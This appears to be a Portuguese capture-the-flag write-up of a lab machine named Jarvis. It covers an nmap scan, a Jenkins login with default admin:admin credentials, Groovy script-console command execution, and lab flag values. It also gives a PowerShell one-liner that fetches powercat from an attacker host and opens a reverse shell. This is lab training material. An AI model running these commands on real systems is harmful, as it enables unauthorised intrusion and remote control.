EHPT - Jarvis

# EHPT - Jarvis

## Enumeração

### Scan inicial

- Executado enumeração inicial com nmap e obtido o seguinte resultado

  ```
  # Nmap 7.80 scan initiated Sat Jun 20 00:33:04 2020 as: nmap -A -p21,80,135,139,445,7592,7680,49664,49665,49666,49667,49668,49669,49673 -Pn -oA full 10.0.0.10
  Nmap scan report for 10.0.0.10
  Host is up (0.00061s latency).
  
  PORT      STATE SERVICE       VERSION
  21/tcp    open  ftp           FileZilla ftpd
  | ftp-syst: 
  |_  SYST: UNIX emulated by FileZilla
  80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  |_http-server-header: Microsoft-HTTPAPI/2.0
  |_http-title: Not Found
  135/tcp   open  msrpc         Microsoft Windows RPC
  139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
  445/tcp   open  microsoft-ds?
  7592/tcp  open  http          Jetty 9.4.z-SNAPSHOT
  |_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
  | http-robots.txt: 1 disallowed entry 
  |_/
  |_http-server-header: Jetty(9.4.z-SNAPSHOT)
  |_http-title: Site doesn't have a title (text/html;charset=utf-8).
  7680/tcp  open  pando-pub?
  49664/tcp open  msrpc         Microsoft Windows RPC
  49665/tcp open  msrpc         Microsoft Windows RPC
  49666/tcp open  msrpc         Microsoft Windows RPC
  49667/tcp open  msrpc         Microsoft Windows RPC
  49668/tcp open  msrpc         Microsoft Windows RPC
  49669/tcp open  msrpc         Microsoft Windows RPC
  49673/tcp open  msrpc         Microsoft Windows RPC
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
  
  Host script results:
  |_clock-skew: 1s
  | nbstat: NetBIOS name: WIN10X64, NetBIOS user: <unknown>, NetBIOS MAC: 00:15:5d:2a:16:30 (Microsoft)
  | Names:
  |   WIN10X64<00>         Flags: <unique><active>
  |   WORKGROUP<00>        Flags: <group><active>
  |_  WIN10X64<20>         Flags: <unique><active>
  | smb2-security-mode: 
  |   2.02: 
  |_    Message signing enabled but not required
  | smb2-time: 
  |   date: 2020-06-20T03:34:00
  |_  start_date: 2020-06-20T01:29:47
  
  Read data files from: /usr/bin/../share/nmap
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  # Nmap done at Sat Jun 20 00:34:03 2020 -- 1 IP address (1 host up) scanned in 59.16 seconds
  ```

### 80/TCP - HTTP

- Ao acessar a pagina via navegador, recebido erro 404. Inspecionando o cabeçalho da resposta nao encontrado muitas informações relevantes além do servidor **Microsoft-HTTPAPI/2.0**

### 7592/TCP - Jetty(9.4.z-Snapshot)

- Ao acessar a pagina do navegador identificado que se tratava de uma instalação do Jenkins. Ao tentar acesso usando credenciais padrão as credenciais **admin:admin** funcionaram e foi possível obter acesso à console.

- Pesquisando um pouco sobre o Jenkins, que é uma ferramenta de automação, encontrado dentro de `Manage Jenkins` uma Script Console onde poderia executar alguns comandos.

- pesquisando um pouco sobre como executar comandos nesat ferramenta, que utiliza uma linguagem chamada `Groovy script` obitido o snippet abaixo que me permitiu executar alguns comandos para testar execução de código remota na maquina

  ```groovy
  def cmd = "cmd /c whoami".execute()
  println("${cmd.text}")
  ```

- Ao executar o comando, retornado o resultado abaixo, o que nos dá permissão de SYSTEM na máquina :)

  ![image-20200620005925502](C:\Temp\EHPT\.assets\image-20200620005925502.png)

## Exploração

## Shell reverso

- Uma vez que obtemos execução remota na maquina, a ideia é obter um shell reverso. 

- Com a execução obtida, realizada uma enumeração rapida para definir qual o payload para obter o shell reverso

  ```groovy
  def cmd = "powershell Get-WmiObject -Class Win32_OperatingSystem | Select Name,caption,Version,OsArchitecture | fl ".execute()
  println("${cmd.text}")
  ```

  ```
  Name           : Microsoft Windows 10 
                   Pro|C:\Windows|\Device\Harddisk0\Partition4
  caption        : Microsoft Windows 10 Pro
  Version        : 10.0.10586
  OsArchitecture : 64-bit
  ```

- A melhor maneira de se obter um shell reverso utilizando powershell é utilizando o powercat. Realizado o clone do projeto na maquina, publicado o arquivo via http e executado o comando abaixo via jenkins

  ```powershell
  def cmd = "powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http://10.0.0.3/powercat.ps1');powercat -c 10.0.0.3 -p 4443 -e cmd".execute()
  println("${cmd.text}")
  ```

- Após obter o shell reverso, obtido a flag de Root conforme o caminho abaixo

  ```
  C:\Users\Administrator\Desktop>type admin.txt
  type admin.txt
  1bc690f34128cdaa2d03d6867e22feba
  ```

- Uma vez que se tem privilégios de SYSTEM no Windows, navegado tambem até a flag de user conforme abaixo

  ```
  C:\Users\pepper\Desktop>type user.txt
  type user.txt
  d83031634026e222b92a073869c5e65d
  ```